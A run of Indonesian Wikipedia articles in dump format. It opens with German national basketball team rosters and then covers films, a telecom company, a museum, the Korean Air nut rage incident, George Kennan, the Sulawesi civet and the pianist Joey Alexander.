Henning Harnisch, Gunther Behnke, Hansi Gnad, Michael Koch, Sascha Hupmann, Kai Nurnberger, Henrik Rödl, Patrick King, Oliver Herkelmann, Arndt Neuhaus, Detlef Musch, Mike Knorr (Pelatih: Dirk Bauermann)

EuroBasket 1995: menempati peringkat ke-11 dari 14 tim

Christian Welp, Ademola Okulaja, Michael Koch, Henrik Rödl, Hansi Gnad, Ingo Freyer, Kai Nurnberger, Patrick King, Teoman Öztürk, Denis Wucherer, Detlef Musch, Mike Knorr (Pelatih: Vladislav Lučić)

EuroBasket 1997: menempati peringkat ke-12 dari 16 tim

Henning Harnisch, Sascha Hupmann, Patrick Femerling, Ademola Okulaja, Vladimir Bogojevic, Henrik Rödl, Tim Nees, Jorg Lutcke, Alexander Kuhl, Denis Wucherer, Gerrit Terdenge, Jurgen Malbeck (Pelatih: Vladislav Lučić)

EuroBasket 1999: menempati peringkat ke-7 dari 16 tim

Dirk Nowitzki, Drazan Tomič, Patrick Femerling, Vladimir Bogojevic, Ademola Okulaja, Henrik Rödl, Kai Nurnberger, Denis Wucherer, Tim Nees, Jorg Lutcke, Gerrit Terdenge, Stephen Arigbabu (Pelatih: Henrik Dettmann)

EuroBasket 2001: menempati peringkat ke-4 dari 16 tim

Dirk Nowitzki, Shawn Bradley, Drazan Tomič, Ademola Okulaja, Patrick Femerling, Robert Garrett, Stipo Papić, Marko Pešić, Mithat Demirel, Stephen Arigbabu, Stefano Garris, Marvin Willoughby (Pelatih: Henrik Dettmann)

Kejuaraan Dunia 2002: menempati peringkat ke-3 dari 16 tim

Dirk Nowitzki, Patrick Femerling, Ademola Okulaja, Henrik Rödl, Marko Pešić, Mithat Demirel, Robert Maras, Stefano Garris, Misan Nikagbatse, Pascal Roller, Stephen Arigbabu, Jorg Lutcke (Pelatih: Henrik Dettmann)

EuroBasket 2003: menempati peringkat ke-11 dari 16 tim

Dirk Nowitzki, Patrick Femerling, Ademola Okulaja, Steffen Hamann, Mithat Demirel, Robert Maras, Marko Pešić, Sven Schultze, Stefano Garris, Jorg Lutcke, Misan Nikagbatse, Stephen Arigbabu (Pelatih: Henrik Dettmann)

EuroBasket 2005: menempati peringkat ke-2 dari 16 tim

Dirk Nowitzki, Patrick Femerling, Robert Garrett, Marko Pešić, Robert Maras, Pascal Roller, Mithat Demirel, Demond Greene, Misan Nikagbatse, Denis Wucherer, Stephen Arigbabu, Sven Schultze (Pelatih: Dirk Bauermann)

Kejuaraan Dunia 2006: menempati peringkat ke-8 dari 24 tim

Dirk Nowitzki, Ademola Okulaja, Patrick Femerling, Robert Garrett, Steffen Hamann, Pascal Roller, Jan-Hendrik Jagla, Mithat Demirel, Sven Schultze, Johannes Herber, Demond Greene, Guido Grunheid (Pelatih: Dirk Bauermann)

EuroBasket 2007: menempati peringkat ke-5 dari 16 tim

Dirk Nowitzki, Patrick Femerling, Ademola Okulaja, Robert Garrett, Jan-Hendrik Jagla, Steffen Hamann, Pascal Roller, Mithat Demirel, Stephen Arigbabu, Johannes Herber, Demond Greene, Guido Grunheid (Pelatih: Dirk Bauermann)

Permainan Olimpiade 2008: menempati peringkat ke-10 dari 12 tim

Tim Ohlbrecht, Philip Zwiener, Sven Schultze, Robert Garrett, Konrad Wysocki, Steffen Hamann, Demond Greene, Pascal Roller, Chris Kaman, Patrick Femerling, Dirk Nowitzki, Jan Jagla (Pelatih: Dirk Bauermann)

EuroBasket 2009 menempati peringkat ke-11 dari 16 tim

Tim Ohlbrecht, Elias Harris, Sven Schultze, Tibor Pleiss, Konrad Wysocki, Steffen Hamann, Demond Greene, Lucca Staiger, Heiko Schaffartzik, Patrick Femerling, Robin Benzing, Jan Jagla (Pelatih: Dirk Bauermann)

Kejuaraan Dunia 2010: menempati peringkat ke-17 dari 24 tim

Tim Ohlbrecht, Elias Harris, Per Günther, Tibor Pleiss, Christopher McNaughton, Steffen Hamann, Demond Greene, Lucca Staiger, Heiko Schaffartzik, Philipp Schwethelm, Robin Benzing, Jan Jagla (Pelatih: Dirk Bauermann)

EuroBasket 2011 menempati peringkat ke-9 dari 24 tim

Dirk Nowitzki, Chris Kaman, Jan-Hendrik Jagla, Tim Ohlbrecht, Sven Schultze, Steffen Hamann, Robin Benzing, Heiko Schaffartzik, Tibor Pleiss, Lucca Staiger, Johannes Herber, Philipp Schwethelm (Pelatih: Dirk Bauermann)




</doc>
<doc id="1752081" url="https://id.wikipedia.org/wiki?curid=1752081" title="Milenge Milenge">
Milenge Milenge

Milenge Milenge ("Kami Akan Bertemu, Kami Akan Bertemu") adalah sebuah film drama percintaan Bollywood 2010. Sebagian berdasarkan pada film 2001 "Serendipity", film tersebut disutradarai oleh Satish Kaushik dan dibintangi oleh Shahid Kapoor dan Kareena Kapoor dalam film kelima mereka bersama setelah "Jab We Met" milik Imtiaz Ali (2007). Anggota lainnya dari pemeran film tersebut meliputi Satish Shah, Aarti Chhabria, dan Delnaaz Paul.

Priya Malhotra (Kareena Kapoor) adalah seorang yatim piatu yang berharap memiliki sebuah keluarga miliknya sendiri dan menyimpan sebuah buku harian yang berisi mimpi-mimpinya dan tipe pria yang ingin ia temui – seseorang yang tidak minum-minum, merokok atau berkata kotor. Ia bersikap skeptis ketika temannya tante Honey (Delnaaz Paul), seorang pembaca kartu, Sunita Rao (Kirron Kher), memprediksi bahwa ia akan pergi ke luar negeri dan menemukan kekasih hidupnya dalam tujuh hari. Ia merasa terkejut ketika ia terpilih untuk pergi ke Festival Pemuda di Bangkok.


Pada 2004, para pemerannya mulai syuting di tempat-tempat seperti Delhi dan Dubai, dan kemudian dilanjutkan dengan pengambilan gambar di Pathways World School.



</doc>
<doc id="1752098" url="https://id.wikipedia.org/wiki?curid=1752098" title="Bangtelindo">
Bangtelindo

Bangtelindo atau PT Pembangunan Telekomunikasi Indonesia adalah sebuah perusahaan di bidang jasa konsultasi, pemasangan, dan pemeliharaan sarana telekomunikasi dan merupakan anak perusahaan dari PT Telekomunikasi Indonesia (Telkom). Perusahaan ini didirikan pada tahun 1993 dan beralamat di Jl.Mangga No 4, Bandung 40114 Indonesia. Pemegang saham perusahaan ini terdiri dari Telkom (2.11%), Dana Pensiun Telkom (54.23%), PT. Transdata Satkomindo (38.37%), Koperasi Telkom (2.65%), PT Industri Telekomunikasi Indonesia (2.65%).

Perusahaan ini didirkan pertama kali pada tahun 1993 oleh tiga perusahaan yaitu PT Telkom Indonesia, INTI, dan Indosat dengan tujuan pembangunan sarana dan prasarana telekomunikasi di Indonesia dari tiga perusahaan tersebut. Pada tahun 1998 Telkom group ditetapkan sebagai pemegang saham mayoritas. Selanjutnya Bangtelindo ditetapkan sebagai Pelaksana OS Jarlokat untuk wilayah usaha di Jakarta dan Surabaya. Terakhir pada tahun 2001, Bangtelindo mendapatkan sertifikat Standar Internasional ISO 9001: 2000 oleh PT. TUV Internasional.


</doc>
<doc id="1752105" url="https://id.wikipedia.org/wiki?curid=1752105" title="Samad Nikkhah Bahrami">
Samad Nikkhah Bahrami

Mohammad Samad Nikkhah Bahrami (, ) adalah seorang pemain basket profesional Iran. Ia sekarang bermain untuk Petrochimi di Liga Super Basket Iran serta dengan tim basket nasional Iran, sebagai pemain depan.

Ia sebelumnya bermain untuk Saba Battery sebagai pemain cadangan, bersama dengan almarhum saudaranya Aidin Nikkhah Bahrami, membantu tim tersebut memenangkan Kejuaraan Asia.

Pada 22 Agustus 2008 Nikkhah menandatangani kontrak setahun dengan tim LNB Prancis Cholet Basket. Hal ini menjadikannya orang Iran pertama yang pernah bermain basket profesional di Prancis. Ia meninggalkan Cholet pada 30 September karena masalah administratif.

Pada 21 Oktober 2008 Nikkhah Bahrami menandatangani kontrak setahun dengan tim Prancis lainnya Élan Béarnais Pau-Orthez.





</doc>
<doc id="1752124" url="https://id.wikipedia.org/wiki?curid=1752124" title="Museum Lampung">
Museum Lampung

Museum Negeri Lampung atau Museum Lampung, adalah sebuah museum yang terletak di Kota Bandar Lampung, provinsi Lampung, Indonesia. Beralamat di Jalan ZA Pagar Alam No.64 Bandar Lampung.

Museum ini merupakan museum pertama dan terbesar di provinsi Lampung dan merupakan kebanggaan masyarakat provinsi Lampung.

Letak museum ini cukup strategis sebab tak jauh dari pusat kota Bandar Lampung, yakni hanya 15 menit perjalanan.
Pembangunan Museum Lampung telah dimulai tahun 1975 dan peletakan batu pertama dilaksanakan tahun 1978. Akan tetapi, peresmiannya baru dilaksanakan pada 24 September 1988 dan diresmikan oleh Menteri Pendidikan dan Kebudayaan kala itu, Prof. Dr. Fuad Hasan. Peresmian tersebut bertepatan dengan peringatan Hari Aksara Internasional yang dipusatkan di PKOR Way Halim.
Ruwa Jurai yang diabadikan
sebagai nama museum ini diambil dari tulisan Sai Bumi Ruwa Jurai dalam logo resmi Provinsi Lampung diresmikan penggunaannya sejak 1 April 1990. Memasuki era otonomi
daerah, museum ini beralih status menjadi UPTD di bawah Dinas Pendidikan Provinsi Lampung.

Museum Lampung adalah salah
satu tempat kunjungan wisata
sejarah sebagai sarana pendidikan, penelitian dan rekreasi. Di halaman museum, bahkan beberapa koleksi unik museum ini akan sudah menyambut setiap pengunjung. Tampak meriam kuno peninggalan masa penjajahan menjadi salah satu ikon dari Museum Lampung itu sendiri.

Selain meriam, replika rumah adat Lampung juga berdiri di halaman museum. Rumah adat lampung dikenal berbentuk panggung yang dimaksudkan untuk melindungi si pemilik rumah dari binatang buas.
Di tambah lagi, ada juga bola besi pembuka lahan. Bola besi ini identik dengan identitas Lampung sebagai daerah tujuan transmigrasi pada
1953-1956. Bola besi ini digunakan untuk membuka lahan transmigrasi di wilayah Lampung Timur, Raman
Utara dan Purbolinggo, Kabupaten Lampung Timur, Seputih Banyak, dan Seputih Raman.

Adapun cara pengoperasiannya adalah dengan ditarik dua traktor guna menumbangkan pohon dan semak di areal tanah datar yang akan menjadi lokasi transmigrasi.

Sementara di dalam museum,
koleksi yang ditampilkan, antara lain koleksi benda budaya yang mewakili
dua kelompok adat yang dominan di Lampung, yakni Sai Bathin (Peminggir) dan Pepadun. Kedua kelompok adat ini masing-masing memiliki kekhasan dalam hal ritual adat dan perangkat atau aksesori
adat, seperti kain tradisional khas Lampung, kain tapis. Rangkaian ritual kedua kelompok adat masing-masing ditampilkan berurutan, mulai dari ritual kelahiran, asah gigi
menjelang dewasa, pernikahan, hingga ritual kematian.


</doc>
<doc id="1752128" url="https://id.wikipedia.org/wiki?curid=1752128" title="The Choice (film)">
The Choice (film)

The Choice adalah film drama romantis Amerika Serikat tahun 2016 yang disutradarai oleh Ross Katz dan diproduseri oleh Theresa Park, Peter Safran, dan Nicholas Sparks. Berdasarkan novel dengan judul yang sama karya Nicholas Sparks tahun 2007, film ini dibintangi oleh Benjamin Walker, Teresa Palmer, Tom Welling, Alexandra Daddario, Maggie Grace, dan Tom Wilkinson. "The Choice" difilmkan di Wilmington, Carolina Utara.

Travis Shaw (Benjamin Walker) tinggal di kota pesisir Beaufort, Carolina Utara, berlayar dan berpesta barbekyu dengan pacarnya, Monica (Alexandra Daddario), dan teman-temannya. Travis melihat tetangga di samping rumahnya, Gabby Holland (Teresa Palmer) bersama anjingnya, Molly, memasang bel angin di luar rumahnya. Malam hari, Gabby kesal dengan Travis, yang bersantai di luar dengan musik yang keras, sehingga ia keluar menemui Travis. Keesokan harinya, Gabby membawa Molly ke klinik hewan karena sakit, bertemu kembali dengan Travis dan ayahnya, Dr. Shep (Tom Wilkinson), yang bekerja sebagai dokter hewan. Molly didiagnosis hamil oleh Dr. Shep. Gabby terkejut dan menduga Molly hamil dari anjing Travis, Moby.

Di malam hari, Travis mengunjungi karnaval bersama Monica dan teman-temannya. Travis dan Monica bertemu dengan Gabby dan tunangannya, Dr. Ryan McCarthy (Tom Welling). Gabby adalah mahasiswa magang jurusan kedokteran dan Ryan adalah dokter pembimbingnya di sebuah rumah sakit. Di tengah malam, Gabby bergegas menemui Travis untuk memeriksa kesehatan Molly setelah melahirkan. Gabby senang dengan kelahiran anak anjing Molly dan berterima kasih kepada Travis. Sejak itu, Gabby dan Travis berbaikan.

Gabby mulai bergabung dengan Travis dan teman-temannya untuk berlayar, tanpa Monica. Adik Travis, Stephanie (Maggie Grace), yang ikut berlayar, menceritakan pribadi dan watak Travis kepada Gabby. Gabby dan Travis saling memperhatikan satu sama lain, pergi ke gereja, merayakan ulang tahun pernikahan Dr. Shep dengan mendiang istrinya, jalan-jalan dan makan malam di rumah Gabby. Ketika makan malam, Gabby dan Travis melakukan perselingkuhan dan bercinta meskipun mereka memiliki pasangan masing-masing.

Di kedai minum, Travis melihat Gabby dan Ryan bersama dengan orang tua Ryan, membicarakan pertunangan. Travis menghampiri mereka, lalu pergi. Gabby yang terkejut berlari menghampiri Travis dan menjelaskan pertunangan itu, namun hubungan Travis dan Gabby berakhir. Gabby membatalkan pertunangannya dan pergi ke rumah orang tuanya di Carolina Selatan. Travis mencari Gabby di rumah sakit, namun ia mendapatkan pukulan dari Ryan di wajahnya. Ia pergi ke rumah orang tua Gabby untuk meyakinkan dan melamar Gabby sebagai istrinya. Orang tuanya merestui dan Gabby menerima lamaran Travis.

Travis dan Gabby menikah dan memiliki dua anak. Beberapa tahun kemudian, ketika hujan deras di malam hari, Gabby kecewa dengan Travis yang mengingkari janji karena sibuk memeriksa hewan peliharaan pasien, sehingga Gabby membatalkan makan malam yang sudah diatur oleh Travis di restoran. Dalam perjalanan pulang, Gabby mengalami kecelakaan saat menyetir mobil, yang membuatnya koma dan tak sadarkan diri di rumah sakit. Travis menyalahkan dirinya sendiri atas kejadian itu, ia selalu menunggu Gabby sampai ia sadar, meskipun Ryan mendiagnosis Gabby tak akan bangun dari komanya.

Travis mengunjungi anak-anaknya, ayahnya dan makam ibunya, dengan ditemani oleh Stephanie yang hamil. Badai datang di malam hari, memaksa Travis dan keluarganya untuk mengungsi. Setelah badai reda di pagi hari, Travis membereskan puing-puing rumahnya, menemukan bel angin Gabby dan membangun rumah perlindungan dari puing-puing rumahnya itu di tepi sungai (tempat Travis dan Gabby berkencan dan melihat langit di malam hari). Bel angin Gabby bergerak kencang dan Travis bergegas ke rumah sakit, bahagia karena Gabby yang sadar dari komanya. Travis dan Gabby pulang menemui anak-anaknya serta Stephanie dan bayinya. Akhirnya, Travis, Gabby dan anak-anaknya berpiknik ke rumah perlindungan, berkumpul bersama melihat langit di malam hari.


Film "The Choice" mendapatkan kritik negatif dari kritikus. Website "Rotten Tomatoes" menilai film ini dengan rating 11% berdasarkan 71 ulasan, dengan nilai rata-rata 3,6/10. Konsensus kritik berkata, "Seperti sepuluh film Nicholas Sparks sebelumnya, film "The Choice" menemukan tragedi yang mengutamakan kekasih bernasib sial di wilayah selatan, bahkan bagi mereka yang menyukai pendahulunya, melodrama tipis ini mungkin merasa menyakitkan". "Metacritic" menilai film ini dengan skor 26/100 berdasarkan 23 kritik, menunjukkan "review yang tidak baik secara umum". Film ini memperoleh nilai rata-rata B+ dalam jajak pendapat "CinemaScore" dari skala A+ sampai F.

Film "The Choice" mendapatkan USD 18,730,891 di Amerika Utara dan USD 4,689,987 di negara lain. Total pendapatan yang dihasilkan oleh film ini mencapai USD 23,420,427, melebihi anggaran produksi film USD 10 juta.

Pada pembukaan akhir pekan, film ini mendapatkan USD 6,050,443, menempati posisi kelima di box office di belakang film "Pride and Prejudice and Zombie" dan "Hail, Caesar!".



</doc>
<doc id="1752131" url="https://id.wikipedia.org/wiki?curid=1752131" title="Insiden kemarahan kacang">
Insiden kemarahan kacang

Sebuah insiden yang dikenal sebagai insiden kemarahan kacang atau nutgate, dan "nut return" () di Korea Selatan, terjadi pada 5 Desember 2014 di Bandar Udara Internasional John F. Kennedy, New York City. Heather Cho (nama Korea: Cho Hyun-ah; Hangul: 조현아), seorang pengusaha yang menjadi wakil presiden Korean Air dan ketua pejabat eksekutif Jaringan Hotel KAL, serta putri dari ketua Korean Air dan CEO Cho Yang-ho, menyuruh pesawat untuk kembali ke gerbang bandar udara sebelum lepas landas, setelah ia menjadi tidak suka dengan cara seorang pramugara menghidangkan kacang di pesawat.

Pada 5 Desember 2014, Cho menaiki Korean Air Penerbangan 86 di Bandar Udara Interasional John F. Kennedy yang akan menuju ke Bandar Udara Internasional Incheon di Korea Selatan. Sebelum lepas landas, ia disajikan kacang macadamia di sebuah kemasan tertutup dan bukannya diatas sebuah piring.

Sebuah drama Korea Selatan yang ditayangkan di Mnet memfilmkan sebuah parodi dari insiden tersebut, namun entah kenapa tidak ditayangkan.


</doc>
<doc id="1752137" url="https://id.wikipedia.org/wiki?curid=1752137" title="Sunny Girl">
Sunny Girl

Sunny Girl () adalah sebuah drama Taiwan 2011 yang dibintangi oleh Wu Chun dan Rainie Yang It is produced by Comic International Productions (). Drama tersebut mulai difilmkan pada Mei 2010 dan diwrap pada 21 September 2010. Drama tersebut difilmkan di lokasi-lokasi di Taiwan, China dan Jepang. Drama tersebut ditayangkan pada musim panas 2011. "Sunny Girl" adalah pembuatan ulang Taiwan dari drama Korea 2002 "Successful Story of a Bright Girl".





</doc>
<doc id="1752141" url="https://id.wikipedia.org/wiki?curid=1752141" title="George F. Kennan">
George F. Kennan

George Frost Kennan (16 Februari 1904 – 17 Maret 2005) adalah penasihat, diplomat, dan sejarawan Amerika Serikat yang dikenal sebagai pengusung kebijakan pembendungan ekspansi Soviet pada akhir Perang Dunia II. Ia kemudian menarik dukungannya dari kebijakan tersebut. Ia sering menyampaikan kuliah dan menulis sejarah hubungan antara Uni Soviet dan Amerika Serikat. Ia juga merupakan salah satu tokoh kebijakan luar negeri yang tergabung dalam "The Wise Men".

Pada akhir 1940-an, tulisan-tulisannya menjadi inspirasi bagi Doktrin Truman dan kebijakan "membendung" Uni Soviet. "Telegram Panjang" yang dikirim Kennan dari Moskwa tahun 1946 dan artikel "The Sources of Soviet Conduct" tahun 1947 menyebutkan bahwa pemerintah Soviet pada dasarnya ekspansionis dan pengaruhnya harus "dibendung" di daerah-daerah yang strategis dan vital bagi Amerika Serikat. Tulisan Kennan menjadi alasan bagi kebijakan anti-Soviet Harry S. Truman. Kennan memainkan peran penting dalam pengembangan program dan lembaga Perang Dingin seperti Rencana Marshall.

Tidak lama setelah konsepnya dijadikan kebijiakan A.S., Kennan mulai mengkritik kebijakan luar negeri yang ia rintis. Menjelang berakhirnya tahun 1948, Kennan yakin bahwa dialog yang positif dapat dibina dengan pemerintah Soviet. Usulannya tidak diterima oleh pemerintahan Truman dan pengaruh Kennan dipinggirkan, apalagi setelah Dean Acheson diangkat sebagai Menteri Luar Negeri tahun 1949. Tidak lama kemudian, strategi Perang Dunia A.S. semakin asertif dan militeristik sehingga Kennan merasa penilaiannya tidak dipertimbangkan.

Pada tahun 1950, Kennan keluar dari Departemen Luar Negeri—kecuali pada dua tugas perwakilan singkat di Moskwa dan Yugoslavia—dan menjadi tokoh realis yang mengkritik kebijakan luar negeri Amerika Serikat. Ia menjadi ilmuwan hubungan internasional di Institute for Advanced Study sejak tahun 1956 sampai meninggal dunia pada usia 101 tahun.

Ia merupakan anggota dewan pendiri Rothermere American Institute di Universitas Oxford.

"George Kennan: A Writing Life" karya Lee Congdon merupakan biografi intelektual Kennan yang diterbitkan oleh ISI Books.

Biografi lainnya, "", ditulis oleh John Lewis Gaddis dan diterbitkan tahun 2011 oleh Penguin.





</doc>
<doc id="1752148" url="https://id.wikipedia.org/wiki?curid=1752148" title="Antonio Beato">
Antonio Beato

Antonio Beato (setelah 1832 – 1906), juga dikenal sebagai Antoine Beato, adalah seorang fotografer Britania dan Italia. Ia dikenal karena karya genrenya, lukisan-lukisannya, pemandangan arsitektur-arsitektur dan landskap-landskap dari Mesir dan lokasi-lokasi lainnya di wilayah Mediterania. Ia adalah adik dari fotografer Felice Beato (1832–1909).

Sedikit yang diketahui tentang asal mula Antonio Beato namun kemungkinan ia lahir di wilayah Venesia setelah 1832, dan kemudian menjadi warga negara Britania Raya yang dinaturalisasikan. Saudaranya lahir di Venesia, namun keluarganya pindah ke Corfu,yang berada pada wilayah Venesia sampai 1814 ketika kota tersebut diambilalih oleh Britania.

Antonio Beato meninggal di Luxor pada 1906.



</doc>
<doc id="1752153" url="https://id.wikipedia.org/wiki?curid=1752153" title="Saigō Jūdō">
Saigō Jūdō

"Laksamana Besar" Marquis (1 Juni 1843 – 18 Juli 1902) adalah seorang politikus dan laksamana Jepang pada jaman Meiji.

Saigō lahir di Shimokajichō, Kagoshima, sebagai putra dari "samurai" Saigō Kichibe dari domain Satsuma. Saudara-saudaranya meliputi kakaknya yang terkenal Saigō Takamori. Saigō diubah namanya beberapa kali selama masa hidupnya. Disamping dua nama yang ada diatas, aia terkadang dipanggil dengan nama julukannya "Shingō". Nama aslinya adalah "Ryūkō", atau "Ryūdō". Nama tersebut kemungkinan berasal dari nama "Ryūsuke".

Setelah Restorasi Meiji, Saigō ingin menjadi pejabat pemerintahan dengan mendaftarkan namanya.

Bekas tempat tinggal Saigō (di Meguro, Tokyo) didaftarkan sebagai Properti Kebudayaan Berpengaruh oleh pemerintah Jepang dan sekarang di taman sejarah Meiji-mura di bagian luar Inuyama, Prefektur Aichi. Saigō juga memiliki sebuah cottage di Yanagihara (sekarang Numazu), Prefektur Shizuoka. Saigō Jūdō adalah orang pertama di Jepang yang memiliki seekor kuda balapan.

"Gensui" Marquis Saigō meninggal pada 1902 dan dimakamkan di Pemakaman Tama di Fuchū di Tokyo.



</doc>
<doc id="1752158" url="https://id.wikipedia.org/wiki?curid=1752158" title="Benteng Taku">
Benteng Taku

Benteng Taku atau Benteng Dagu (), juga disebut Benteng Peiho () adalah benteng yang terletak di pinggiran Sungai Hai (Sungai Peiho), di Distrik Tanggu, munisipalitas Tianjin, di timur laut China. Benteng tersebut berjarak dari tenggara pusat perkotaan Tianjin.

Benteng tersebut pertama kali dibangun pada masa pemerintahan Kaisar Ming Jiajing antara 1522 dan 1527.



</doc>
<doc id="1752161" url="https://id.wikipedia.org/wiki?curid=1752161" title="Musang sulawesi">
Musang sulawesi

Musang sulawesi ("Macrogalidia musschenbroekii") adalah musang yang sedikit diketahui dan endemis di Sulawesi. Hewan ini didaftarkan sebagai spesies rentan oleh International Union for Conservation of Nature karena penurunan populasi yang diperkirakan lebih dari 30% selama 3 generasi terakhir (dicurigai selama 15 tahun) yang diduga akibat kerusakan habitat dan degradasi lingkungan..

"Macrogalidia" adalah genus monospesifik.

Musang sulawesi memiliki lapisan tipis dan pendek berwarna kastanye cokelat muda dengan sejumlah campuran bulu halus. Bagian tubuh bawahnya beragam dari kuning kemerahan hingga putih; dadanya sedikit berwarna kemerahan. Ada sepasang garis membujur yang tak jelas dan beberapa titik gelap di bagian tersembunyi di punggung. Cambangnya bercampur antara cokelat dan putih. Ekornya ditandai dengan cincin gelap dan cokelat muda yang berselang-seling, yang tidak dapat dibedakan di permukaan bawah, dan lenyap menuju ujung yang gelap. Panjang kepala dan tubuhnya sekitar dengan ekor sepanjang . Tengkorak dengan palatum durum banyak terbentuk ke belakang, namun sebaliknya menyerupai "Paradoxurus hermaphroditus". Giginya berbeda dari semua spesies "Paradoxurus" karena 2 seri pipinya sejajar daripada divergen luas ke arah belakang.

Musang sulawesi tercatat berada di hutan dataran rendah, hutan montane atas dan bawah, semak belukar dan dekat pertanian. Mereka tampak lebih umum di hutan daripada di daerah pertanian. Meskipun tampaknya generalis sehingga mungkin dapat mentoleransi beberapa derajat habitat yang terganggu, tidak ada bukti yang baik bila populasi itu dapat bertahan tanpa hutan lebat.

Musang sulawesi adalah omnivora yang memakan mamalia kecil, buah, dan rumput. Kadang-kadang, musang sulawesi memakan burung dan hewan pertanian. Kisaran tempat tinggalnya diperkirakan sekitar .



</doc>
<doc id="1752162" url="https://id.wikipedia.org/wiki?curid=1752162" title="Balaklava">
Balaklava

Balaklava (, , ) adalah sebuah bekas kota di Semenanjung Krimea dan bagian dari kota Sevastopol. Tempat tersebut menjadi sebuah kota dalam haknya sendiri sampai 1957 ketika tempat tersebut secara resmi dimasukkan dalam perbatasan munisipal Sevastopol oleh pemerintah Soviet. Kota tersebut juga merupakan sebuah pusat administratif dari Bakalava Raion yang digunakan untuk menjadi bagian dari Oblast Krimea sebelum kota tersebut dipindahkan ke Munisipalitas Sevastopol.

Balaklava telah berpindah tangan beberapa kali pada sejarahnya. Sebuah pemukiman di lokasi saat ininya aslinya dibentuk dengan nama Symbolon (Συμβολον) oleh Yunani Kuno, karena tempat tersebut merupakan kota komersial berpengaruh.

Pada Abad Pertengahan, kota tersebut dikuasai oleh Kekaisaran Bizantium dan kemudian oleh Genoa yang menaklukannya pada 1365. Bizantium menyebut kota tersebut Yamboli dan Genoa menamainya Cembalo. Bangsa Genoa membangun sebuah kekaisaran perdagangan besar di Mediterania dan Laut Hitam, membeli budak-budak di Eropa Timur dan mengirim mereka ke Mesir melalui Krimea.



</doc>
<doc id="1752165" url="https://id.wikipedia.org/wiki?curid=1752165" title="Joey Alexander">
Joey Alexander

Joey Alexander (lahir: Josiah Alexander Sila; ) adalah pianis jazz asal Indonesia. Dalam usia sangat muda (7 tahun) ia telah menguasai teknik permainan piano dan improvisasi yang sangat penting dalam aliran musik jazz. Ia merilis album musik perdananya yang berjudul "My Favorite Things" pada tanggal 12 Mei 2015 di usia 11 tahun di bawah Motema Record, New York. Melalui album ini, Joey mendapatkan nominasi Anugerah Grammy untuk dua kategori: Best Instrumental Jazz Album ("My Favorite Things") dan Best Jazz Solo Improvisation ("Giant Steps" dari album tersebut). Ia juga bekesempatan Tampil sepanggung dengan Adele,Taylor Swift,Ed Sheeran,Bruno Mars Dll di Grammy Awards 2016. Ia juga menjadi Artis Asia Tenggara Pertama yang tampil di acara bergengsi tersebut.

Joey hampir sepenuhnya belajar musik jazz sendiri (autodidak) sejak usia enam tahun, ketika ia diberi hadiah keyboard oleh orang tuanya. Ia pernah tampil di hadapan Herbie Hancock dan Bill Clinton. Pada tahun 2014, Wynton Marsalis mengundang Alexander untuk bermain di malam gala Jazz at Lincoln Center 2014, dan ia menjadi "sensasi dalam semalam", tulis "The New York Times". Joey memenangi Grand Prix dalam Master-Jam Fest 2013, dan tampil di Montreal International Jazz Festival dan Newport Jazz Festival 2015.

Alexander adalah artis Indonesia pertama yang masuk dalam Billboard 200 di Amerika Serikat, dengan album debutnya "My Favorite Things" mencapai peringkat 174 pada 30 Mei 2015. Ia Juga menjadi artis ke 2 dari Indonesia yang sukses di Chart Billboard setelah Anggun. Untuk saat ini, Joey Alexander dan Anggun adalah artis Indonesia yang sukses tampil di perhelatan penghargaan musik bergengsi tingkat Dunia. Di mana Anggun tampil di World Music Awards dan Joey di Grammy Awards.Riwayat awalJoey Alexander Sila lahir di Bali, Indonesia, dari pasangan Denny Sila dan Farah Leonora Urbach, yang menjalankan usaha wisata petualangan. Ini dia adalah keponakan dari penyanyi Nafa Urbach. Ayahnya adalah musisi amatir, dan kedua orang tuanya adalah penggemar musik jazz, khususnya karya Louis Armstrong. Alexander belajar jazz dengan mendengarkan album klasik ayahnya. Pada usia enam tahun ia belajar sendiri bermain piano dengan keyboard listrik kecil pemberian ayahnya, dengan mendengarkan komposisi seperti "Well, You Needn't" karya Thelonious Monk dan lagu-lagu jazz lain yang dikoleksi ayahnya. Alexander mengatakan bahwa baginya belajar alat musik terasa alamiah; orang tuanya yang beragama Kristen, percaya bahawa bakatnya adalah "anugerah Tuhan". Alexander menganggap Monk, John Coltrane, Harry Connick, Jr., Bill Evans dan Herbie Hancock sebagai panutan musiknya, selain juga mengagumi , Miles Davis, Wynton Marsalis, Brad Mehldau, , dan McCoy Tyner.

Karena tidak ada kursus jazz formal di kampung halamannya, Alexander mulai bermain dalam "jam session" bersama musisi berpengalaman di Bali dan Jakarta, di mana akhirnya keluarganya menetap setelah menutup bisnis wisatanya supaya Alexander dapat tingal dekat dengan musisi jazz papan atas Indonesia. Alexander bermain untuk Hancock pada usia 8 tahun ketika ia mengunjungi Jakarta sebagai duta UNESCO. Hancock berkata pada Alexander bahwa ia yakin padanya, dan Alexander kemudian melukiskan hal itu sebagai "hari ketika aku mempersembahkan masa kecilku untuk jazz". Pada usia 9 tahun, Alexander meraih Grand Prix dalam Master-Jam Fest 2013, kompetisi musik jazz untuk segala usia di Odessa, Ukraina, yang diikuti 43 musisi dari 17 negara. Alexander dan keluarganya pindah ke New York pada tahun 2014.

Pemain trompet jazz Wynton Marsalis, direktur seni Jazz at Lincoln Center, mendengar tentang Alexander setelah seorang teman menyarankannya menonton video yang menampilkan dirinya membawakan karya Coltrane, Monk dan Chick Corea. Marsalis memuji Alexander sebagai "jagoannya" di akun Facebooknya, dan mengundangnya ke malam gala Mei 2014, ketika Alexander berusia 10 tahun. Hari itu adalah debut Alexander di Amerika Serikat. Ia mendapat tanggapan positif untuk penampilannya, khususnya versi solo ' karya Monk. "The New York Times" menulis ia menjadi "sensasi dalam semalam" setelah pertunjukan itu. Allen Morrison dari majalah "" mengatakan: "Kalau kata 'jenius' masih mempunyai arti, anak inilah wujudnya. Ia memainkan variasi solonya sendiri untuk 'Round Midnight' dengan kecerdasan dan keahlian seperti pianis berpengalaman puluhan tahun." Marsalis mengatakan: "Tidak ada seorangpun yang anda kenal bisa bermain seperti itu seusianya. Saya suka semua tentang permainannya – iramanya, kepercayaan dirinya, dan pemahaman musiknya." Jeanne Moutoussamy-Ashe, janda maestro tenis , mengundang Alexander untuk tampil di gala Arthur Ashe Learning Center, di mana ia tampil di hadapan mantan presiden A.S. . Moutoussamy-Ashe memperkenalkannya pada Gordon Uehling III, pendiri CourtSense Tennis Training Center, yang mengizinkan Alexander dan keluarganya tinggal di wismanya di .

